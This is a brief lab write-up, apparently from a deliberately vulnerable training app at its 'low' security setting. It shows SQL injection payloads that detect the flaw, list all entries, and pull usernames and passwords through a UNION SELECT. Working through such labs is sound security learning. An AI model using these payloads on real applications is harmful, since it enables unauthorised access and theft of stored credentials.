Security level is currently: low.

We can detect SQL injection with ' on submiting this we get SQL error.

we can see all entries with ' or 1=1# :

![Screenshot 2025-04-25 031141](https://github.com/user-attachments/assets/9100776d-0185-476b-8e3a-eb7877cb3e90)

We can extract all passwords with payload:

' UNION SELECT user, password FROM users#

![Screenshot 2025-04-25 031223](https://github.com/user-attachments/assets/3eb42d8a-c3c3-4bbf-9375-4686e54bd4e8)


